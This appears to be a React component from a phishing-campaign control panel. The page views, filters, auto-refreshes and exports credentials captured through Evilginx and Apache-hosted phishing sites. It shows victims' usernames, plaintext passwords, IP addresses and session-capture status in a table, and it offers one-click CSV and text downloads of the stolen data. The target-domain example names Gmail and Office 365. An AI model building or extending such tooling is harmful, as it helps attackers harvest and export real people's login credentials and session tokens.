import React, { useState, useEffect } from 'react';
import { API_ENDPOINTS, fetchApi } from '../api';

function Monitoring() {
  const [credentials, setCredentials] = useState([]);
  const [monitors, setMonitors] = useState([]);
  const [loading, setLoading] = useState(true);
  const [monitorLoading, setMonitorLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState({ type: '', text: '' });
  const [activeMonitor, setActiveMonitor] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [isReloading, setIsReloading] = useState(false);
  
  // New state for monitor creation
  const [showNewMonitorForm, setShowNewMonitorForm] = useState(false);
  const [newMonitor, setNewMonitor] = useState({
    name: '',
    sources: ['evilginx', 'apache_phishing'],
    domains: ''
  });

  const [showDownloadOptions, setShowDownloadOptions] = useState(false);

  useEffect(() => {
    // Initial load
    fetchCredentials();
    fetchMonitors();

    // Set up auto-refresh
    let intervalId;
    if (autoRefresh) {
      intervalId = setInterval(() => {
        fetchCredentials();
        fetchMonitors(); // Also refresh monitors to update credential counts
      }, 10000); // Refresh every 10 seconds
    }

    return () => {
      if (intervalId) {
        clearInterval(intervalId);
      }
    };
  }, [autoRefresh, activeMonitor]);

  const fetchCredentials = () => {
    setLoading(true);
    
    let url = API_ENDPOINTS.credentials.list;
    if (activeMonitor) {
      url = `${url}?monitor_id=${activeMonitor}`;
    }
    
    // Use a GET request here
    fetch(url)
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          // Sort credentials by timestamp, newest first
          const sortedCreds = data.credentials.sort((a, b) => {
            return new Date(b.timestamp) - new Date(a.timestamp);
          });
          
          // Deduplicate credentials based on ID
          const uniqueCreds = [];
          const seenIds = new Set();
          
          for (const cred of sortedCreds) {
            if (cred.id && !seenIds.has(cred.id)) {
              seenIds.add(cred.id);
              uniqueCreds.push(cred);
            } else if (!cred.id) {
              // If no ID, use a combination of username, password, and IP as unique identifier
              const tempId = `${cred.username || ''}-${cred.password || ''}-${cred.ip || ''}`;
              if (!seenIds.has(tempId)) {
                seenIds.add(tempId);
                uniqueCreds.push(cred);
              }
            }
          }
          
          setCredentials(uniqueCreds);
        }
        setLoading(false);
      })
      .catch(error => {
        console.error('Error fetching credentials:', error);
        setLoading(false);
      });
  };

  const fetchMonitors = () => {
    setMonitorLoading(true);
    // Use a GET request here
    fetch(API_ENDPOINTS.credentials.monitors)
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          setMonitors(data.monitors);
          
          // Set first active monitor as default if none selected
          if (!activeMonitor && Object.keys(data.monitors).length > 0) {
            const activeMonitorIds = Object.keys(data.monitors).filter(
              id => data.monitors[id].active
            );
            if (activeMonitorIds.length > 0) {
              setActiveMonitor(activeMonitorIds[0]);
            }
          }
        }
        setMonitorLoading(false);
      })
      .catch(error => {
        console.error('Error fetching monitors:', error);
        setMonitorLoading(false);
      });
  };

  const startNewMonitor = () => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Process domains input
    const domainsList = newMonitor.domains
      ? newMonitor.domains.split(',').map(d => d.trim()).filter(d => d)
      : [];

    const monitorData = {
      name: newMonitor.name || `Monitor ${new Date().toLocaleString()}`,
      sources: newMonitor.sources,
      domains: domainsList
    };

    // Use POST with the new monitor configuration
    fetch(API_ENDPOINTS.credentials.start, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(monitorData)
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'New monitoring session started successfully!'
          });
          
          // Set the new monitor as active
          setActiveMonitor(data.monitor_id);
          
          // Reset form and hide it
          setNewMonitor({
            name: '',
            sources: ['evilginx', 'apache_phishing'],
            domains: ''
          });
          setShowNewMonitorForm(false);
          
          // Refresh monitors list
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to start monitoring session.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while starting the monitoring session.'
        });
      });
  };

  const stopMonitor = (monitorId) => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Use POST for this endpoint
    fetch(`${API_ENDPOINTS.credentials.stop}/${monitorId}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Monitoring session stopped successfully!'
          });
          
          // Refresh monitors list
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to stop monitoring session.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while stopping the monitoring session.'
        });
      });
  };

  const activateMonitor = (monitorId) => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    // Use POST for this endpoint - follows the same pattern as stopMonitor
    fetch(`${API_ENDPOINTS.credentials.activate}/${monitorId}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success' || data.status === 'info') {
          setMessage({
            type: 'success',
            text: 'Monitoring session activated successfully!'
          });
          
          // Refresh monitors list
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to activate monitoring session.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while activating the monitoring session.'
        });
      });
  };

  const clearCredentials = () => {
    setSubmitting(true);
    setMessage({ type: '', text: '' });

    const requestBody = activeMonitor ? { monitor_id: activeMonitor } : {};

    // Use POST for this endpoint
    fetch(API_ENDPOINTS.credentials.clear, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(requestBody)
    })
      .then(response => response.json())
      .then(data => {
        setSubmitting(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: 'Credentials cleared successfully!'
          });
          
          // Refresh credentials
          fetchCredentials();
          fetchMonitors(); // Update counts
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to clear credentials.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setSubmitting(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while clearing credentials.'
        });
      });
  };
  
  const reloadAllCredentials = () => {
    setIsReloading(true);
    setMessage({ type: '', text: '' });
    
    // Use POST for this endpoint
    fetch(API_ENDPOINTS.credentials.reload, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then(response => response.json())
      .then(data => {
        setIsReloading(false);
        if (data.status === 'success') {
          setMessage({
            type: 'success',
            text: data.message || `Reloaded credentials successfully!`
          });
          
          // Refresh data
          fetchCredentials();
          fetchMonitors();
        } else {
          setMessage({
            type: 'error',
            text: data.message || 'Failed to reload credentials.'
          });
        }
      })
      .catch(error => {
        console.error('Error:', error);
        setIsReloading(false);
        setMessage({
          type: 'error',
          text: 'An error occurred while reloading credentials.'
        });
      });
  };
  
  const handleNewMonitorChange = (e) => {
    const { name, value, type, checked } = e.target;
    
    if (type === 'checkbox') {
      // Handle checkboxes for sources
      const sourceName = e.target.getAttribute('data-source');
      let updatedSources = [...newMonitor.sources];
      
      if (checked) {
        if (!updatedSources.includes(sourceName)) {
          updatedSources.push(sourceName);
        }
      } else {
        updatedSources = updatedSources.filter(source => source !== sourceName);
      }
      
      setNewMonitor(prev => ({
        ...prev,
        sources: updatedSources.length ? updatedSources : ['evilginx'] // Ensure at least one source
      }));
    } else {
      // Handle regular inputs
      setNewMonitor(prev => ({
        ...prev,
        [name]: value
      }));
    }
  };

    // Download functionality
  const downloadCredentials = (format) => {
    if (!credentials.length) {
      setMessage({
        type: 'error',
        text: 'No credentials available to download.'
      });
      return;
    }

    let content = '';
    let filename = '';
    let mimeType = '';

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
    const monitorName = activeMonitor && monitors[activeMonitor] 
      ? monitors[activeMonitor].name.replace(/[^a-zA-Z0-9]/g, '_')
      : 'all_monitors';

    if (format === 'csv') {
      // Create CSV content
      const headers = ['Source', 'Domain', 'Username', 'Password', 'IP_Address', 'Session_Captured', 'Timestamp'];
      const csvRows = [headers.join(',')];
      
      credentials.forEach(cred => {
        const row = [
          `"${cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}"`,
          `"${cred.domain || cred.phishlet || ''}"`,
          `"${cred.username || ''}"`,
          `"${cred.password || ''}"`,
          `"${cred.ip || ''}"`,
          `"${cred.session_captured ? 'Yes' : 'No'}"`,
          `"${new Date(cred.timestamp).toLocaleString()}"`
        ];
        csvRows.push(row.join(','));
      });
      
      content = csvRows.join('\n');
      filename = `credentials_${monitorName}_${timestamp}.csv`;
      mimeType = 'text/csv;charset=utf-8;';
    } else if (format === 'txt') {
      // Create text content
      const header = `Credential Monitoring Report\n` +
                    `Generated: ${new Date().toLocaleString()}\n` +
                    `Monitor: ${activeMonitor && monitors[activeMonitor] ? monitors[activeMonitor].name : 'All Monitors'}\n` +
                    `Total Credentials: ${credentials.length}\n` +
                    `${'='.repeat(60)}\n\n`;
      
      const credentialEntries = credentials.map((cred, index) => {
        return `Entry ${index + 1}:\n` +
               `  Source: ${cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}\n` +
               `  Domain: ${cred.domain || cred.phishlet || 'N/A'}\n` +
               `  Username: ${cred.username || 'N/A'}\n` +
               `  Password: ${cred.password || 'N/A'}\n` +
               `  IP Address: ${cred.ip || 'N/A'}\n` +
               `  Session Captured: ${cred.session_captured ? 'Yes' : 'No'}\n` +
               `  Timestamp: ${new Date(cred.timestamp).toLocaleString()}\n` +
               `${'-'.repeat(40)}`;
      }).join('\n\n');
      
      content = header + credentialEntries;
      filename = `credentials_${monitorName}_${timestamp}.txt`;
      mimeType = 'text/plain;charset=utf-8;';
    }

    // Create and trigger download
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    setShowDownloadOptions(false);
    setMessage({
      type: 'success',
      text: `Credentials downloaded as ${format.toUpperCase()} successfully!`
    });
  };

  return (
    <div className="monitoring">
      <h1>Credential Monitoring</h1>
      <p>View captured credentials from your phishing campaigns.</p>

      {/* Monitoring Controls */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Monitoring Controls</h2>
        </div>
        
        {message.text && (
          <div className={`alert alert-${message.type}`}>
            {message.text}
          </div>
        )}
        
        <div className="monitoring-controls">
          <div className="control-group">
            {!showNewMonitorForm ? (
              <button
                className="btn btn-primary"
                onClick={() => setShowNewMonitorForm(true)}
              >
                Configure New Monitor
              </button>
            ) : (
              <div className="new-monitor-form">
                <h3>New Monitor Configuration</h3>
                <div className="form-group">
                  <label htmlFor="monitor-name">Monitor Name:</label>
                  <input
                    type="text"
                    id="monitor-name"
                    name="name"
                    value={newMonitor.name}
                    onChange={handleNewMonitorChange}
                    placeholder="Enter a descriptive name"
                  />
                </div>
                
                <div className="form-group">
                  <label>Monitor Sources:</label>
                  <div className="checkbox-group">
                    <label className="checkbox-label">
                      <input
                        type="checkbox"
                        data-source="evilginx"
                        checked={newMonitor.sources.includes('evilginx')}
                        onChange={handleNewMonitorChange}
                      />
                      Evilginx
                    </label>
                    <label className="checkbox-label">
                      <input
                        type="checkbox"
                        data-source="apache_phishing"
                        checked={newMonitor.sources.includes('apache_phishing')}
                        onChange={handleNewMonitorChange}
                      />
                      Apache Phishing Sites
                    </label>
                  </div>
                </div>
                
                <div className="form-group">
                  <label htmlFor="monitor-domains">Target Domains (comma-separated):</label>
                  <input
                    type="text"
                    id="monitor-domains"
                    name="domains"
                    value={newMonitor.domains}
                    onChange={handleNewMonitorChange}
                    placeholder="e.g., gmail.com, office365.com"
                  />
                  <small>Leave empty to monitor all domains</small>
                </div>
                
                <div className="form-actions">
                  <button
                    className="btn btn-success"
                    onClick={startNewMonitor}
                    disabled={submitting}
                  >
                    {submitting ? 'Starting...' : 'Start Monitor'}
                  </button>
                  <button
                    className="btn btn-secondary"
                    onClick={() => setShowNewMonitorForm(false)}
                  >
                    Cancel
                  </button>
                </div>
              </div>
            )}
            
            <div className="form-group inline">
              <label htmlFor="auto-refresh">
                <input
                  type="checkbox"
                  id="auto-refresh"
                  checked={autoRefresh}
                  onChange={() => setAutoRefresh(!autoRefresh)}
                />
                Auto-refresh (every 10s)
              </label>
            </div>
            
            <button
              className="btn btn-info"
              onClick={reloadAllCredentials}
              disabled={isReloading}
            >
              {isReloading ? 'Reloading...' : 'Reload All Credentials'}
            </button>
          </div>
          
          {monitorLoading ? (
            <div className="loading">
              <div className="loading-spinner"></div>
            </div>
          ) : Object.keys(monitors).length > 0 ? (
            <div className="monitor-selector">
              <label htmlFor="active-monitor">Select Monitor:</label>
              <select
                id="active-monitor"
                value={activeMonitor || ''}
                onChange={(e) => setActiveMonitor(e.target.value)}
              >
                <option value="">All Monitors</option>
                {Object.entries(monitors).map(([id, monitor], index) => (
                  <option key={index} value={id}>
                    {monitor.name} - {monitor.active ? 'Active' : 'Inactive'} ({monitor.credential_count} credentials)
                  </option>
                ))}
              </select>
              
              {activeMonitor && (
                <div className="monitor-actions">
                  {monitors[activeMonitor]?.active ? (
                    <button
                      className="btn btn-warning"
                      onClick={() => stopMonitor(activeMonitor)}
                      disabled={submitting}
                    >
                      Stop Monitor
                    </button>
                  ) : (
                    <button
                      className="btn btn-success"
                      onClick={() => activateMonitor(activeMonitor)}
                      disabled={submitting}
                    >
                      Activate Monitor
                    </button>
                  )}
                </div>
              )}
            </div>
          ) : (
            <p>No monitors. Create a new monitoring session.</p>
          )}
          
          {/* Monitor Details */}
          {activeMonitor && monitors[activeMonitor] && (
            <div className="monitor-details">
              <h3>Monitor Details</h3>
              <table className="details-table">
                <tbody>
                  <tr>
                    <td>Name:</td>
                    <td>{monitors[activeMonitor].name}</td>
                  </tr>
                  <tr>
                    <td>Status:</td>
                    <td>
                      <span className={monitors[activeMonitor].active ? 'status-active' : 'status-inactive'}>
                        {monitors[activeMonitor].active ? 'Active' : 'Inactive'}
                      </span>
                    </td>
                  </tr>
                  <tr>
                    <td>Sources:</td>
                    <td>
                      {monitors[activeMonitor].sources.includes('evilginx') && (
                        <span className="source-badge evilginx">Evilginx</span>
                      )}
                      {monitors[activeMonitor].sources.includes('apache_phishing') && (
                        <span className="source-badge apache">Apache Phishing</span>
                      )}
                    </td>
                  </tr>
                  <tr>
                    <td>Target Domains:</td>
                    <td>
                      {monitors[activeMonitor].domains && monitors[activeMonitor].domains.length > 0
                        ? monitors[activeMonitor].domains.join(', ')
                        : 'All domains'}
                    </td>
                  </tr>
                  <tr>
                    <td>Credentials:</td>
                    <td>{monitors[activeMonitor].credential_count}</td>
                  </tr>
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* Credentials Table */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Captured Credentials</h2>
          <div className="card-actions">
            <button
              className="btn btn-secondary"
              onClick={fetchCredentials}
            >
              Refresh
            </button>
                       
            {/* Download Button with Dropdown */}
            <div className="download-container">
              <button
                className="btn btn-download"
                onClick={() => setShowDownloadOptions(!showDownloadOptions)}
                disabled={!credentials.length}
              >
                Download ({credentials.length})
              </button>
              
              {showDownloadOptions && (
                <div className="download-dropdown">
                  <button
                    className="download-option"
                    onClick={() => downloadCredentials('csv')}
                  >
                    📊 Download as CSV
                  </button>
                  <button
                    className="download-option"
                    onClick={() => downloadCredentials('txt')}
                  >
                    📄 Download as Text
                  </button>
                </div>
              )}
            </div>
            <button
              className="btn btn-danger"
              onClick={clearCredentials}
              disabled={submitting}
            >
              Clear Credentials
            </button>
          </div>
        </div>
        
        {loading ? (
          <div className="loading">
            <div className="loading-spinner"></div>
          </div>
        ) : credentials.length > 0 ? (
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Source</th>
                  <th>Domain</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>IP Address</th>
                  <th>Session Captured</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {credentials.map((cred, index) => (
                  <tr key={index}>
                    <td>
                      <span className={`source-badge ${cred.source_type === 'evilginx' ? 'evilginx' : 'apache'}`}>
                        {cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}
                      </span>
                    </td>
                    <td>{cred.domain || cred.phishlet || '-'}</td>
                    <td>{cred.username || '-'}</td>
                    <td>{cred.password || '-'}</td>
                    <td>{cred.ip || '-'}</td>
                    <td>{cred.session_captured ? 'Yes' : 'No'}</td>
                    <td>{new Date(cred.timestamp).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <p>No credentials captured yet.</p>
        )}
      </div>
      
      {/* Add some basic CSS */}
      <style jsx>{`
        .source-badge {
          padding: 2px 8px;
          border-radius: 4px;
          font-size: 12px;
          font-weight: bold;
          text-transform: uppercase;
          color: white;
        }

         .btn-download {
          background-color: #17a2b8;
          color: white;
          position: relative;
        }
        .btn-download:disabled {
          background-color: #6c757d;
          cursor: not-allowed;
        }
        .download-container {
          position: relative;
          display: inline-block;
        }
        .download-dropdown {
          position: absolute;
          top: 100%;
          right: 0;
          background: white;
          border: 1px solid #ddd;
          border-radius: 4px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          z-index: 1000;
          min-width: 180px;
        }
        .download-option {
          display: block;
          width: 100%;
          padding: 10px 15px;
          border: none;
          background: white;
          text-align: left;
          cursor: pointer;
          font-size: 14px;
          border-bottom: 1px solid #eee;
        }
        .download-option:hover {
          background-color: #f8f9fa;
        }
        .download-option:last-child {
          border-bottom: none;
        }
          
        .source-badge.evilginx {
          background-color: #ff5722;
        }
        .source-badge.apache {
          background-color: #4caf50;
        }
        .monitor-details {
          margin-top: 20px;
          padding: 15px;
          background-color: #f9f9f9;
          border-radius: 4px;
        }
        .details-table {
          width: 100%;
        }
        .details-table td {
          padding: 5px;
        }
        .details-table td:first-child {
          font-weight: bold;
          width: 150px;
        }
        .status-active {
          color: #4caf50;
          font-weight: bold;
        }
        .status-inactive {
          color: #f44336;
          font-weight: bold;
        }
        .checkbox-group {
          display: flex;
          gap: 15px;
        }
        .checkbox-label {
          display: flex;
          align-items: center;
          gap: 5px;
        }
        .form-group {
          margin-bottom: 15px;
        }
        .form-group label {
          display: block;
          margin-bottom: 5px;
        }
        .form-group input[type="text"] {
          width: 100%;
          padding: 8px;
          border: 1px solid #ddd;
          border-radius: 4px;
        }
        .form-actions {
          display: flex;
          gap: 10px;
          margin-top: 15px;
        }
        .monitor-actions {
          margin-top: 10px;
        }
        .new-monitor-form {
          border: 1px solid #eee;
          padding: 15px;
          border-radius: 5px;
          margin-bottom: 20px;
        }
        .btn-info {
          background-color: #5bc0de;
          color: white;
          margin-left: 10px;
        }
        .btn-success {
          background-color: #5cb85c;
          color: white;
        }
        .btn-warning {
          background-color: #f0ad4e;
          color: white;
        }
        .btn-danger {
          background-color: #d9534f;
          color: white;
        }
        .btn-primary {
          background-color: #337ab7;
          color: white;
        }
        .btn-secondary {
          background-color: #6c757d;
          color: white;
        }
        .alert {
          padding: 10px 15px;
          margin-bottom: 15px;
          border-radius: 4px;
        }
        .alert-success {
          background-color: #dff0d8;
          color: #3c763d;
          border: 1px solid #d6e9c6;
        }
        .alert-error {
          background-color: #f2dede;
          color: #a94442;
          border: 1px solid #ebccd1;
        }
        .monitoring {
          padding: 20px;
        }
        .card {
          border: 1px solid #ddd;
          border-radius: 5px;
          margin-bottom: 20px;
          background-color: white;
        }
        .card-header {
          padding: 15px;
          border-bottom: 1px solid #eee;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        .card-title {
          margin: 0;
          font-size: 18px;
          font-weight: bold;
        }
        .card-actions {
          display: flex;
          gap: 10px;
        }
        .monitoring-controls {
          padding: 15px;
        }
        .control-group {
          display: flex;
          align-items: center;
          flex-wrap: wrap;
          margin-bottom: 15px;
        }
        .btn {
          padding: 8px 15px;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          font-weight: bold;
        }
        .btn:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }
        .loading {
          display: flex;
          justify-content: center;
          padding: 20px;
        }
        .loading-spinner {
          border: 4px solid #f3f3f3;
          border-top: 4px solid #3498db;
          border-radius: 50%;
          width: 30px;
          height: 30px;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .table-responsive {
          overflow-x: auto;
        }
        table {
          width: 100%;
          border-collapse: collapse;
        }
        table th, table td {
          padding: 10px;
          text-align: left;
          border-bottom: 1px solid #eee;
        }
        table th {
          background-color: #f9f9f9;
          font-weight: bold;
        }
        .monitor-selector {
          margin-top: 15px;
        }
        .monitor-selector select {
          padding: 8px;
          border: 1px solid #ddd;
          border-radius: 4px;
          margin-left: 10px;
          width: 300px;
        }
        .form-group.inline {
          display: flex;
          align-items: center;
        }
        .form-group.inline label {
          margin-bottom: 0;
          display: flex;
          align-items: center;
          gap: 5px;
        }
      `}</style>
    </div>
  );
}

export default Monitoring;